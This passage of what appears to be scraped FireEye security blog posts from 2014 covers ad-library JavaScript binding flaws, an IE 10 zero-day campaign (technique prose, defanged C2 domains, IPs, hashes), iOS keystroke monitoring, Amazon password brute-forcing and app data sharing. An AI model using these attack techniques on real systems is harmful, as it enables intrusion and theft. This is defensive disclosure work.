this case, over the Internet, without a user’s consent. We have analyzed the top 40 third-party ad libraries (not including Google Ads) used by Android apps. Among the apps with over 100,000 downloads each on Google Play, over 42 percent of the free apps currently contain at least one of these top ad libraries. The total download count of such apps now exceeds 12.4 billion. From our analysis, at least 47 percent of these top 40 ad libraries have at least one version of their code in active use by popular apps on Google Play, and contain the JS-Binding-Over-HTTP vulnerability. As an example, InMobi versions 2.5.0 and above use the JavaScript binding method addJavascriptInterface and load content in the WebView using HTTP. Security Issues with JavaScript Binding Annotation Starting with Android 4.2, Google introduced the @JavascriptInterface annotation to explicitly designate and limit which public Java methods in the app are accessible from JavaScript running inside a WebView. However, note that the @JavascriptInterface annotation does not provide any protection for devices using Android 4.1 or below, which is still running on more than 80 percent of Android devices worldwide. We discovered a new class of security issues, which we call JavaScript Sidedoor ( JS sidedoor ), in ad libraries. If an ad library uses the @JavascriptInterface annotation to expose security-sensitive interfaces, and uses HTTP to load content in the WebView, then it is vulnerable to attacks where an attacker over the network (e.g., via WIFI or DNS hijacking) could inject malicious content into the WebView to misuse the interfaces exposed through the JS binding annotation. We call these exposed JS binding annotation interfaces JS sidedoors . For example, starting with version 3.6.2, InMobi added the @JavascriptInterface JS binding annotation. The list of exposed methods through the JS binding annotation in InMobi includes: createCalendarEvent (version 3.7.0 and above) makeCall (version 3.6.2 and above) postToSocial (version 3.7.0 and above) sendMail (version 3.6.2 and above) sendSMS (version 3.6.2 and above) takeCameraPicture (version 3.7.0 and above) getGalleryImage (version 3.7.0 and above) registerMicListener (version 3.7.0 and above) InMobi also provides JavaScript wrappers to these methods in the JavaScript code served from their ad servers, as shown in Appendix A. InMobi also loads content in the WebView using HTTP. If an app has the Android permission CALL_PHONE, and is using InMobi versions 3.6.2 to 4.0.2, an attacker over the network (for example, using Wi-Fi or DNS hijacking) could abuse the makeCall annotation in the app to make phone calls on the device without a user’s consent – including to premium numbers. In addition, without requiring special Android permissions in the host app, attackers over the network, via HTTP or DNS hijacking, could also misuse the aforementioned exposed methods to misguide the user to post to the user’s social network from the device ( postToSocial in version 3.7.0 and above), send email to any designated recipient with a pre-crafted title and email body ( sendMail in version 3.6.2 and above), send SMS to premium numbers ( sendSMS in version 3.6.2 and above), create calendar events on the device ( createCalendarEvent in version 3.7.0 and above), and to take pictures and access the photo gallery on the device ( takeCameraPicture and getGalleryImage in version 3.7.0 and above). To complete these actions, the user would need to click on certain consent buttons. However, as generally known, users are quite vulnerable to social engineering attacks through which attackers could trick users to give consent. We have identified more than 3,000 apps on Google Play that contain versions 2.5.0 to 4.0.2 of InMobi – and which have over 100,000 downloads each as of December, 2013. Currently, the total download count for these affected apps is greater than 3.7 billion . We have informed both Google and InMobi of our findings, and they have been actively working to address them. New InMobi Update after FireEye Notification After we notified the InMobi vendor about these security issues, they promptly released new SDK versions 4.0.3 and 4.0.4. The 4.0.3 SDK, marked as “Internal release”, was superseded by 4.0.4 after one day. The 4.0.4 SDK made the following changes: Changed its method exposed through annotation for making phone calls ( makeCall ) to require user’s consent. Added a new storePicture interface to download and save specified files from the Internet to the user’s Downloads folder. Despite the name, it can be used for any file, not just images. Compared with InMobi’s earlier versions, we consider change No. 1 as an improvement that addresses the aforementioned issue of an attacker making phone calls without a user’s consent. We are glad to see that InMobi made this change after our notification. InMobi recently released a new SDK version 4.1.0. Compared with SDK version 4.0.4, we haven't seen any changes to JS Binding usage from a security perspective in this new SDK version 4.1.0. Moving Forward: Improving Security for JS Binding in Third-party Libraries In summary, the insecure usage of JS Binding and JS Binding annotations in third-party libraries exposes many apps that contain these libraries to security risks. App developers and third-party library vendors often focus on new features and rich functionalities. However, this needs to be balanced with a consideration for security and privacy risks. We propose the following to the mobile application development and library vendor community: Third-party library vendors need to explicitly disclose security-sensitive features in their privacy policies and/or their app developer SDK guides. Third-party library vendors need to educate the app developers with information, knowledge, and best practices regarding security and privacy when leveraging their SDK. App developers need to use caution when leveraging third-party libraries, apply best practices on security and privacy, and in particular, avoid misusing vulnerable APIs or packages. When third-party libraries use JS Binding, we recommend using HTTPS for loading content. Since customers may have different requirements regarding security and privacy, apps with JS-Binding-Over-HTTP vulnerabilities and JS sidedoors can introduce risks to security-sensitive environments such as enterprise networks. FireEye Mobile Threat Prevention provides protection to our customers from these kinds of security threats. Acknowledgement We thank our team members Adrian Mettler and Zheng Bu for their help in writing this blog. Appendix A: JavaScript Code Snippets Served from InMobi Ad Servers a.takeCameraPicture = function () { utilityController.takeCameraPicture() }; a.getGalleryImage = function () { utilityController.getGalleryImage() }; a.makeCall = function (f) { try { utilityController.makeCall(f) } catch (d) { a.showAlert(\"makeCall: \" + d) } }; a.sendMail = function (f, d, b) { try { utilityController.sendMail(f, d, b) } catch (c) { a.showAlert(\"sendMail: \" + c) } }; a.sendSMS = function (f, d) { try { utilityController.sendSMS(f, d) } catch (b) { a.showAlert(\"sendSMS: \" + b) } }; a.postToSocial = function (a, c, b, e) { a = parseInt(a); isNaN(a) && window.mraid.broadcastEvent(\"error\", \"socialType must be an integer\", \"postToSocial\"); \"string\" != typeof c && (c = \"\"); \"string\" != typeof b && (b = \"\"); \"string\" != typeof e && (e = \"\"); utilityController.postToSocial(a, c, b, e) }; a.createCalendarEvent = function (a) { \"object\" != typeof a && window.mraid.broadcastEvent(\"error\", \"createCalendarEvent method expects parameter\", \"createCalendarEvent\"); \"string\" != typeof a.start || \"string\" != typeof a.end ? window.mraid.broadcastEvent(\"error\", \"createCalendarEvent method expects  string parameters for start and end dates\", \"createCalendarEvent\") : (\"string\" != typeof a.location && (a.location = \"\"), \"string\" != typeof a.description && (a.description = \"\"), utilityController.createCalendarEvent(a.start, a.end, a.location, a.description)) }; a.registerMicListener=function() { utilityController.registerMicListener() }; Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2014/01/trends-in-targeted-attacks-2013.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2014-01-13",
                    "source": "www.fireeye.com"
                },
                "text": "FireEye has been busy over the last year. We have tracked malware-based espionage campaigns and published research papers on numerous advanced threat actors. We chopped through Poison Ivy , documented a cyber arms dealer , and revealed that Operation Ke3chang had targeted Ministries of Foreign Affairs in Europe. Worldwide, security experts made many breakthroughs in cyber defense research in 2013. I believe the two biggest stories were Mandiant’s APT1 report and the ongoing Edward Snowden revelations, including the revelation that the U.S. National Security Agency (NSA) compromised 50,000 computers around the world as part of a global espionage campaign. In this post, I would like to highlight some of the outstanding research from 2013. Trends in Targeting Targeted malware attack reports tend to focus on intellectual property theft within specific industry verticals. But this year, there were many attacks that appeared to be related to nation-state disputes, including diplomatic espionage and military conflicts. Conflict Where kinetic conflict and nation-state disputes arise, malware is sure to be found. Here are some of the more interesting cases documented this year: Middle East: continued attacks targeting the Syrian opposition; further activity by Operation Molerats related to Israel and Palestinian territories. India and Pakistan: tenuous relations in physical world equate to tenuous relations in cyberspace. Exemplifying this trend was the Indian malware group Hangover , the ByeBye attacks against Pakistan, and Pakistan-based attacks against India. Korean peninsula: perhaps foreshadowing future conflict, North Korea was likely behind the Operation Troy (also known as DarkSeoul ) attacks on South Korea that included defacements, distributed denial-of-service (DDoS) attacks, and malware that wiped hard disks. Another campaign, Kimsuky , may also have a North Korean connection. China: this was the source of numerous attacks, including the ongoing Surtr campaign, against the Tibetan and Uygur communities, which targeted MacOS and Android. Diplomacy Malware continues to play a key role in espionage in the Internet era. Here are some examples that stood out this year: The Snowden documents revealed that NSA and GCHQ deployed key logging malware during the G20 meeting in 2009. In fact, G20 meetings have long been targets for foreign intelligence services, including this year’s G20 meeting in Russia. The Asia-Pacific Economic Cooperation ( APEC ) and The Association of Southeast Asian Nations ( ASEAN ) are also frequent targets. FireEye announced that Operation Ke3chang compromised at least five Ministries of Foreign Affairs in Europe. Red October , EvilGrab , and Nettraveler (aka RedStar) targeted both diplomatic missions and commercial industries. Technical Trends Estimations of “sophistication” often dominate the coverage of targeted malware attacks. But what I find interesting is that simple changes made to existing malware are often more than enough to evade detection. Even more surprising is that technically “unsophisticated” malware is often found in the payload of “sophisticated” zero-day exploits. And this year quite a number of zero-days were used in targeted attacks. Exploits Quite a few zero-day exploits appeared in the wild this year, including eleven discovered by FireEye. These exploits included techniques to bypass ASLR and application sandboxes. The exploits that I consider the most significant are the following: CVE-2013-0640 , which was used in the MiniDuke attacks, CVE-2013-1347 , which was used in a watering hole attack on the Department of Labor website, CVE-2013-3893 , which was deployed by the same group, DeputyDog, which compromised Bit9 earlier in the year, CVE-2013-3906 , which was used in both targeted attacks and in cybercrime campaigns DeputyDog in a watering hole attack. Evasion The malware samples used by several advanced persistent threat (APT) actors were slightly modified this year, possibly as an evasive response to increased scrutiny, in order to avoid detection. For example, there were changes to Aumlib and Ixeshe , which are malware families associated with APT12, the group behind attacks on the New York Times . When APT1 (aka Comment Crew) returned after their activities were exposed, they also used modified malware. In addition, Terminator (aka FakeM ), and Sykipot were modified. Threat Actors Attribution is a tough problem, and the term itself has multiple meanings . Some use it to refer to an ultimate benefactor, such as a nation-state. Others use the term to refer to malware authors, or command-and-control (CnC) operators. This year, I was fascinated by published research about exploit and malware dealers and targeted attack contractors (also known as cyber “hitmen”), because it further complicates the traditional “state-sponsored” analysis that we’ve become accustomed to. Dealers — The malware and exploits used in targeted attacks are not always exclusively available to one threat actor. Some are supplied by commercial entities such as FinFisher , which has been reportedly used against activists around the world, and HackingTeam , which sells spyware to governments and law enforcement agencies. FireEye discovered a likely cyber arms dealer that is connected to no fewer than 11 APT campaigns – however, the relationship between the supplier and those who use the malware remains unclear. Another similar cluster, known as the Maudi Operation , was also documented this year. Hitmen — Although this analysis is still highly speculative, some threat actors, such as Hidden Lynx , may be “hackers for hire”, tasked with breaking into targets and acquiring specific information. Others, such as IceFog , engage in “hit and run” attacks, including the propagation of malware in a seemingly random fashion. Another group, known as Winnti , tries to profit by targeting gaming companies with malware (PlugX) that is normally associated with APT activity. In one of the weirdest cases I have seen, malware known as “ MiniDuke ”, which is reminiscent of some “old school” malware developed by 29A, was used in multiple attacks around the world. My colleagues at FireEye have put forward some interesting stealthy techniques in the near future. In any case, 2014 will no doubt be another busy year for those of us who research targeted malware attacks. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2014/02/amazons-mobile-shopping-clients-and-captcha.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2014-02-26",
                    "source": "www.fireeye.com"
                },
                "text": "Amazon is a popular online retailer serving millions of users. Unfortunately, FireEye mobile security researchers have found security issues within Amazon’s mobile apps on both Android and iOS platforms through which attackers can crack the passwords of target Amazon accounts. Amazon confirmed our findings and hot fixed the issue. Recently, we found two security issues within Amazon’s mobile apps on both Android and iOS platforms: No limitation or CAPTCHA for password attempts Weak password policy Attackers can exploit these two security issues remotely against target Amazon accounts. Figure 1. Verification Code for Wrong Password Attempts A CAPTCHA (\"Completely Automated Public Turing test to tell Computers and Humans Apart\") is a challenge-response test designed to determine whether the user is a human. CAPTCHAs are well adopted for preventing programmed bots from accessing online services for bad purposes, such as conducting denial-of-service attacks, harvesting information and cracking passwords. The web version of Amazon requires the user to complete a CAPTCHA after ten incorrect password attempts (Figure 1), to prevent password cracking. However, Amazon’s mobile apps haven’t adopted such protection using CAPTCHA (Figure 2 and Figure 3). This design flaw provides attackers the chance to crack any Amazon account’s password using brute force. Figure 2. Amazon Android App Figure 3. Amazon iOS App Furthermore, Amazon doesn’t have a strong password strength requirement. It accepts commonly used weak passwords such as \"123456\" and \"111111\". We know that the weaker the password, the easier for hackers to break into an account. Therefore, allowing weak passwords puts account safety to potential security risks. Given that there are many well-known previous password leakages , attackers can use these password leakages as knowledge bases to conduct password cracking. As a proof of concept, we figured out the password of one Amazon account we setup within 1000 attempts, using the latest version (2.8.0) of Amazon’s Android shopping client. After receiving our vulnerability report, Amazon hot fixed the first issue by patching their server. Now if the user tries multiple incorrect passwords, the server will block the user from login (Figure 4). In the future, we suggest adding CAPTCHA support for Amazon mobile (Android and iOS) apps, and enforcing requirements for stronger passwords. Figure 4. Wrong Password Block Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2014/02/background-monitoring-on-non-jailbroken-ios-7-devices-and-a-mitigation.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2014-02-25",
                    "source": "www.fireeye.com"
                },
                "text": "Background monitoring mobile applications has become a hot topic on mobile devices. Existing reports show that such monitoring can be conducted on jailbroken iOS devices. FireEye mobile security researchers have discovered such vulnerability, and found approaches to bypass Apple's app review process effectively and exploit non-jailbroken iOS 7 successfully. We have been collaborating with Apple on this issue. Fig.1 Background Monitoring We have created a proof-of-concept \"monitoring\" app on non-jailbroken iOS 7.0.x devices. This “monitoring” app can record all the user touch/press events in the background, including, touches on the screen, home button press, volume button press, and TouchID press, and then this app can send all user events to any remote server, as shown in Fig.1. Potential attackers can use such information to reconstruct every character the victim inputs. Note that the demo exploits the latest 7.0.4 version of iOS system on a non-jailbroken iPhone 5s device successfully. We have verified that the same vulnerability also exists in iOS versions 7.0.5, 7.0.6, and 6.1.x. Based on the findings, potential attackers can either use phishing to mislead the victim to install a malicious/vulnerable app or exploit another remote vulnerability of some app, and then conduct background monitoring. Fig.2 Background App Refresh Settings Fig.3 Killing An App on iOS7 iOS7 provides settings for \"background app refresh\". Disabling unnecessary app's background refreshing contributes to preventing the potential background monitoring. However, it can be bypassed. For example, an app can play music in the background without turning on its \"background app refresh\" switch. Thus a malicious app can disguise itself as a music app to conduct background monitoring. Before Apple fixes this issue, the only way for iOS users to avoid this security risk is to use the iOS task manager to stop the apps from running in the background to prevent potential background monitoring. iOS7 users can press the Home button twice to enter the task manager and see preview screens of apps opened, and then swipe an app up and out of preview to disable unnecessary or suspicious applications running on the background, as shown in Fig.3. We conducted this research independently before we were aware of this recent report . We hope this blog could help users understand and mitigate this threat further. Acknowledgement: Special thanks to Jari Salomaa for his valuable comments and feedback. We also thank Raymond Wei, Dawn Song, and Zheng Bu for their valuable help on writing this blog. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2014/02/operation-snowman-deputydog-actor-compromises-us-veterans-of-foreign-wars-website.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2014-02-13",
                    "source": "www.fireeye.com"
                },
                "text": "On February 11, FireEye identified a zero-day exploit (CVE-2014-0322)  being served up from the U.S. Veterans of Foreign Wars’ website (vfw[.]org). We believe the attack is a strategic Web compromise targeting American military personnel amid a paralyzing snowstorm at the U.S. Capitol in the days leading up to the Presidents Day holiday weekend. Based on infrastructure overlaps and tradecraft similarities, we believe the actors behind this campaign are associated with two previously identified campaigns ( Operation DeputyDog and Operation Ephemeral Hydra ). This blog post examines the vulnerability and associated attacks, which we have dubbed “Operation SnowMan.\" Exploit/Delivery analysis After compromising the VFW website, the attackers added an iframe into the beginning of the website’s HTML code that loads the attacker’s page in the background. The attacker’s HTML/JavaScript page runs a Flash object, which orchestrates the remainder of the exploit. The exploit includes calling back to the IE 10 vulnerability trigger, which is embedded in the JavaScript.  Specifically, visitors to the VFW website were silently redirected through an iframe to the exploit at www.[REDACTED].com/Data/img/img.html. Mitigation The exploit targets IE 10 with Adobe Flash. It aborts exploitation if the user is browsing with a different version of IE or has installed Microsoft’s Experience Mitigation Toolkit (EMET). So installing EMET or updating to IE 11 prevents this exploit from functioning. Vulnerability analysis The vulnerability is a previously unknown use-after-free bug in Microsoft Internet Explorer 10. The vulnerability allows the attacker to modify one byte of memory at an arbitrary address. The attacker uses the vulnerability to do the following: Gain access to memory from Flash ActionScript, bypassing address space layout randomization (ASLR) Pivot to a return-oriented programing (ROP) exploit technique to bypass data execution prevention (DEP) EMET detection The attacker uses the Microsoft.XMLDOM ActiveX control to load a one-line XML string containing a file path to the EMET DLL. Then the exploit code parses the error resulting from the XML load order to determine whether the load failed because the EMET DLL is not present.  The exploit proceeds only if this check determines that the EMET DLL is not present. ASLR bypass Because the vulnerability allows attackers to modify memory to an arbitrary address, the attacker can use it to bypass ASLR. For example, the attacker corrupts a Flash Vector object and then accesses the corrupted object from within Flash to access memory. We have discussed this technique and other ASLR bypass approaches in our blog . One minor difference between the previous approaches and this attack is the heap spray address, which was changed to 0x1a1b2000 in this exploit. Code execution Once the attacker’s code has full memory access through the corrupted Flash Vector object, the code searches through loaded libraries gadgets by machine code. The attacker then overwrites the vftable pointer of a flash.Media.Sound() object in memory to point to the pivot and begin ROP. After successful exploitation, the code repairs the corrupted Flash Vector and flash.Media.Sound to continue execution. Shellcode analysis Subsequently, the malicious Flash code downloads a file containing the dropped malware payload. The beginning of the file is a JPG image; the end of the file (offset 36321) is the payload, encoded with an XOR key of 0x95. The attacker appends the payload to the shellcode before pivoting to code control. Then, when the shellcode is executed, the malware creates files “sqlrenew.txt” and “stream.exe”. The tail of the image file is decoded, and written to these files. “sqlrenew.txt” is then executed with the LoadLibraryA Windows API call. ZxShell payload analysis As documented above, this exploit dropped an XOR (0x95) payload that executed a ZxShell backdoor (MD5: 8455bbb9a210ce603a1b646b0d951bce). The compile date of the payload was 2014-02-11, and the last modified date of the exploit code was also 2014-02-11. This suggests that this instantiation of the exploit was very recent and was deployed for this specific strategic Web compromise of the Veterans of Foreign Wars website. A possible objective in the SnowMan attack is targeting military service members to steal military intelligence. In addition to retirees, active military personnel use the VFW website. It is probably no coincidence that Monday, Feb. 17, is a U.S. holiday, and much of the U.S. Capitol shut down Thursday amid a severe winter storm. The ZxShell backdoor is a widely used and publicly available tool used by multiple threat actors linked to cyber espionage operations. This particular variant called back to a command and control server located at newss[.]effers[.]com. This domain currently resolves to 118.99.60.142. The domain info[.]flnet[.]org also resolved to this IP address on 2014-02-12. Infrastructure analysis The info[.]flnet[.]org domain overlaps with icybin[.]flnet[.]org and book[.]flnet[.]org via the previous resolutions to the following IP addresses: 58.64.200.178 58.64.200.179 103.20.192.4 First Seen Last Seen CnC Domain IP 2013-08-31 2013-08-31 2013-08-31 2013-08-31 icybin.flnet[.]org icybin.flnet[.]org 58.64.200.178 58.64.200.178 2013-05-02 2013-05-02 2013-08-02 2013-08-02 info.flnet[.]org info.flnet[.]org 58.64.200.178 58.64.200.178 2013-08-02 2013-08-02 2013-08-02 2013-08-02 book.flnet[.]org book.flnet[.]org 58.64.200.178 58.64.200.178 2013-08-10 2013-08-10 2013-08-10 2013-08-10 info.flnet[.]org info.flnet[.]org 58.64.200.179 58.64.200.179 2013-07-15 2013-07-15 2013-07-15 2013-07-15 icybin.flnet[.]org icybin.flnet[.]org 58.64.200.179 58.64.200.179 2014-01-02 2014-01-02 2014-01-02 2014-01-02 book.flnet[.]org book.flnet[.]org 103.20.192.4 103.20.192.4 2013-12-03 2013-12-03 2014-01-02 2014-01-02 info.flnet[.]org info.flnet[.]org 103.20.192.4 103.20.192.4 We previously observed Gh0stRat samples with the custom packet flag “HTTPS” calling back to book[.]flnet[.]org and icybin[.]flnet[.]org. The threat actor responsible for Operation DeputyDog also used the “HTTPS” version of the Gh0st . We also observed another “HTTPS” Gh0st variant connecting to a related command and control server at me[.]scieron[.]com. MD5 Hash CnC Domain 758886e58f9ea2ff22b57cbbb015166e 758886e58f9ea2ff22b57cbbb015166e book.flnet[.]org book.flnet[.]org 0294f9280491f85d898ebe471f0fb58e 0294f9280491f85d898ebe471f0fb58e icybin.flnet[.]org icybin.flnet[.]org 9d20566a327076b7152bbf9ed20292c4 9d20566a327076b7152bbf9ed20292c4 me.scieron[.]com me.scieron[.]com The me[.]scieron[.]com domain previously resolved to 58.64.199.22. The book[.]flnet[.]org domain also resolved to another IP in the same subnet 58.64.199.0/24. Specifically, book[.]flnet[.]org previously resolved to 58.64.199.27. Others domain seen resolving to this same /24 subnet were dll[.]freshdns[.]org, ali[.]blankchair[.]com, and cht[.]blankchair[.]com. The domain dll[.]freshdns[.]org resolved to 58.64.199.25. Both ali[.]blankchair[.]com and cht[.]blankchair[.]com resolved to 58.64.199.22. First Seen Last Seen CnC Domain IP 2012-11-12 2012-11-12 2012-11-28 2012-11-28 me.scieron[.]com me.scieron[.]com 58.64.199.22 58.64.199.22 2012-04-09 2012-04-09 2012-10-24 2012-10-24 cht.blankchair[.]com cht.blankchair[.]com 58.64.199.22 58.64.199.22 2012-04-09 2012-04-09 2012-09-18 2012-09-18 ali.blankchair[.]com ali.blankchair[.]com 58.64.199.22 58.64.199.22 2012-11-08 2012-11-08 2012-11-25 2012-11-25 dll.freshdns[.]org dll.freshdns[.]org 58.64.199.25 58.64.199.25 2012-11-23 2012-11-23 2012-11-27 2012-11-27 rt.blankchair[.]com rt.blankchair[.]com 58.64.199.25 58.64.199.25 2012-05-29 2012-05-29 2012-6-28 2012-6-28 book.flnet[.]org book.flnet[.]org 58.64.199.27 58.64.199.27 A number of other related domains resolve to these IPs and other IPs also in this /24 subnet. For the purposes of this blog, we’ve chosen to focus on those domains and IP that relate to the previously discussed DeputyDog and Ephemeral Hydra campaigns. You may recall that dll[.]freshdns[.]org, ali[.]blankchair[.]com and cht[.]blankchair[.]com were all linked to both Operation DeputyDog and Operation Ephemeral Hydra . Figure 1 illustrates the infrastructure overlaps and connections we observed between the strategic Web compromise campaign leveraging the VFW’s website, the DeputyDog, and the Ephemeral Hydra operations. Figure 1: Ties between Operation SnowMan, DeputyDog, and Ephemeral Hydra Links to DeputyDog and Ephemeral Hydra Other tradecraft similarities between the actor(s) responsible for this campaign and the actor(s) responsible for the DeputyDog/Ephemeral Hydra campaigns include: The use of zero-day exploits to deliver a remote access Trojan (RAT) The use of strategic web compromise as a vector to distribute remote access Trojans The use of a simple single-byte XOR encoded (0x95) payload obfuscated with a .jpg extension The use of Gh0stRat with the “HTTPS” packet flag The use of related command-and-control (CnC) infrastructure during the similar time frames We observed many similarities from the exploitation side as well. At a high level, this attack and the CVE-2013-3163 attack both leveraged a Flash file that orchestrated the exploit, and would call back into IE JavaScript to trigger an IE flaw. The code within the Flash files from each attack are extremely similar. They build ROP chains and shellcode the same way, both choose to corrupt a Flash Vector object, have some identical functions with common typos, and even share the same name. Conclusion These actors have previously targeted a number of different industries, including: U.S. government entities Japanese firms Defense industrial base (DIB) companies Law firms Information technology (IT) companies Mining companies Non-governmental organizations (NGOs) The proven ability to successfully deploy a number of different private and public RATs using zero-day exploits against high-profile targets likely indicates that this actor(s) will continue to operate in the mid to long-term. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2014/02/write-once-exploit-everywhere-fireeye-report-analyzes-four-widely-exploited-java-vulnerabilities.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2014-02-21",
                    "source": "www.fireeye.com"
                },
                "text": "Over the last couple of decades, Java has become the lingua franca of software development, a near-universal platform that works across different operating systems and devices. With its “write once, run anywhere” mantra, Java has drawn a horde of developers looking to serve a large user base as efficiently as possible. Cyber attackers like Java for many of the same reasons. With a wide pool of potential targets, the platform has become the vehicle of choice for quickly dispersing lucrative crimeware packages. In our continuing mission to equip security professionals against today’s advanced cyber threats, FireEye has published a free report, “ Brewing Up Trouble: Analyzing Four Widely Exploited Java Vulnerabilities .” The report outlines four commonly exploited Java vulnerabilities and maps out the step-by-step infection flow of exploits kits that leverage them. Download the paper to learn more about these vulnerabilities: CVE-2013-2471 , which allows attackers to override Java’s getNumDataElements() method, leading to memory corruption. CVE-2013-2465 ,  which involves insufficient bounds checks in the storeImageArray() function. This vulnerability is used by White Lotus and other exploit kits. CVE-2012-4681 ,  which allows attackers to bypass security checks using the findMethod () function. CVE-2013-2423 , which  arises due to insufficient validation in the findStaticSetter () method, leading to Java type confusion. This vulnerability employed by RedKit and other exploits kits. As explained in the paper, Java’s popularity among the developers and widespread use in Web browsers all but  guarantees continuing interest from threat actors. Motivated by the profits, cyber attackers are bound to adopt more intelligent exploit kits. And these attacks will continue to mushroom as more threat actors scramble for a piece of the crimeware pie. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2014/03/a-little-bird-told-me-personal-information-sharing-in-angry-birds-and-its-ad-libraries.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2014-03-27",
                    "source": "www.fireeye.com"
                },
                "text": "Many popular mobile apps, including Rovio’s ubiquitous Angry Birds, collect and share players’ personal information much more widely than most people realize. Some news reports have begun to scratch the surface of the situation. The New York Times reported on Angry Birds and other data-hungry apps last October. And in January, the newspaper teamed up with public-interest news site ProPublica and U.K. newspaper the Guardian for a series of stories detailing how government agencies use the game (and other mobile apps) to collect personal data. Even the long-running CBS show 60 Minutes reported earlier this month that Rovio shares users’ locations . The Android version of Angry Birds in the Google Play store, updated on March 4, continues to share personal information. In fact, more than a quarter billion users who create Rovio accounts to save their game progress across multiple devices might be unwittingly sharing all kinds of information—age, gender, and more — with multiple parties. And many more users who play the game without a Rovio account are sharing their device information without realizing it. Once a Rovio account is created and personal information uploaded, the user can do little to stop this personal information sharing. Their data might be in multiple locations: Angry Birds Cloud, Burstly (ad mediation platform), and third-party ad networks such as Jumptap and Millennial Media. Users can avoid sharing personal data by playing Angry Birds without Rovio account, but that won’t stop the game from sharing device information. In this blog post, we examine the personal information Angry Birds collects. We also demonstrate the relationships between the app, the ad mediation platform, and the ad clouds — showing how the information flows among the three. We also spell out the evidence, such as network packet capture (PCap) from FireEye Mobile Threat Prevention (MTP), to support our information flow chart. Finally, we reveal how the multi-stage information sharing works by tracking the code paths from the reverse-engineered source code. To investigate the mechanism and contents of the information sharing, we researched different versions of Angry Birds. We found that multiple versions of the game can share personal information in clear text, including email, address, age, and gender. Angry Birds’ data management service, “ad-x.co.uk,” shares information in the penultimate version of the game (V4.0.0), which was offered in the Google Play store through March 4.  And contrary to media reports that this data sharing occurred only on an older “special edition” of the game, we found that some  sharing occurs in multiple versions of Angry Birds — including the latest to the “classic” version, 4.1.0. (This update as added to Google Play on March 4.) With more than 2 billion downloads of Angry Birds so far, this sharing affects many, many devices. What information is shared? Angry Birds encourages players to create Rovio accounts, touting the following benefits: To save scores and in-game weapons To preserve game progress across multiple devicesThe second benefit is especially attractive to devoted Angry Birds players because it allows them to stop playing on one device and pick up where they left off on another. Figure 1 shows the Rovio registration page. [caption id=\"attachment_4889\" align=\"aligncenter\" width=\"546\"] Figure 1: Rovio’s registration page[/caption] Figure 2 shows birthday information collected during registration. The end-use license agreement (EULA) and privacy policy grant Rovio rights to upload the collected information to third-party entities for marketing. [caption id=\"attachment_4894\" align=\"aligncenter\" width=\"546\"] Figure 2: The registration of the Rovio account includes personal information and EULA.[/caption] In Figure 3, the registration page asks for the user’s email address and gender.  When the player clicks the register button, Rovio uploads the collected data to the Angry Birds Cloud to create a player profile. [caption id=\"attachment_4897\" align=\"aligncenter\" width=\"546\"] Figure 3: Rovio asks for email and gender information during registration.[/caption] Figure 4 shows another way Angry Birds collects personal information.  Rovio offers a newsletter to update Angry Birds players with new games, episodes, and special offers.  During newsletter signup, Rovio collects the player’s first and last name, email address, date of birth, country of residence, and gender. This information is aggregated with the user’s Rovio account profile by matching the player’s email address. [caption id=\"attachment_4899\" align=\"aligncenter\" width=\"546\"] Figure 4: Newsletter registration page requesting more personal information[/caption] [caption id=\"attachment_5017\" align=\"alignnone\" width=\"549\"] Figure 5: Information flow among Angry Birds, the ad intermediate platform and the ad cloud[/caption] First, we are concerned with the type of information transmitted to the advertisement library. Figure 5 illustrates the information flow among Angry Birds, the Angry Birds Cloud, Burstly (the embedded ad library and ad mediation platform), and cloud-based ad services such as Jumptap and Millennial Media. Angry Birds uses Burstly as an ad adapter, which provides integration with numerous third-party ad clouds including Jumptap and Millennial Media. The ad services use players’ personal data to target ads. As the figure shows, Angry Birds maintains an HTTP connection with the advertising platform Burstly, the advertisement provider Millennial Media, and more. Traffic flow Table 1 summarizes the connections, which we explain in detail below. PCap Burstly (Ad Mediation Platform) Third Party Ad Clouds 1 1 POST (personal information, IP) POST (personal information, IP) 2 2 GET Ad from Jumptap GET Ad from Jumptap 3 3 GET Ad from Turn.com GET Ad from Turn.com Table 1: PCap information exchanged between Angry Birds, Burstly and third-party ad clouds Angry Birds uses native code called libAngryBird.so to access storage and help the ad libraries store logs, caches, database, configuration files, and AES-encrypted game data. For users with a Rovio account, this data includes the user's personal information in clear text or easily decrypted formats. For example, some information is stored in clear text in the web view cache called webviewCacheChromium: {\"accountId\":\"AC3XXX...XXXA62B\",\"accountExtRef\":\"hE...fDc\",\"personal\":{\"firstName\":null,\"lastName\":null, \"birthday\":\"19XXXXX-01\", \"age\":\"30\", \"gender\":\"FEMALE\", \"country\":\"United States\" , \"countryCode\":\"US\" , \"marketingConsent\":false, \"avatarId\":\"AVXXX...XXX2c\",\"imageAssets\":[...], \"nickName\":null}, \"abid\":{ \"email\":\"eXXX...XXXe@XXX.XXX\" , \"isConfirmed\":false}, \"phoneNumber\":null, \"facebook\":{\"facebookId\":\"\",\"email\":\"\"},\"socialNetworks\":[]} The device is given a universal id 1XXXX8, which is stored in the webviewCookiesChromium database in clear text: cu 1XXXX8 |{\"name\":\"cu 1XXXX8 \",\"value\":\"3%2XXX...XXX6+PM\"}|13XXX...XXX1 The id \"1XXXX8\" labels the personal information when uploaded by the ad mediation platform. Then the information is passed to ad clouds. 1. The initial traffic captures in the PCap shows what kind of information Angry Birds uploads to Burstly: HTTP/1.1 200 OK Cache-Control: private Date: Thu, 06 Mar 2014 XX:XX:XX GMT Server: Microsoft-IIS/7.5 ServerName: P-ADS-OR-WEBC #22 X-AspNet-Version: 4.0.30319 X-Powered-By: ASP.NET X-ReqTime: 0 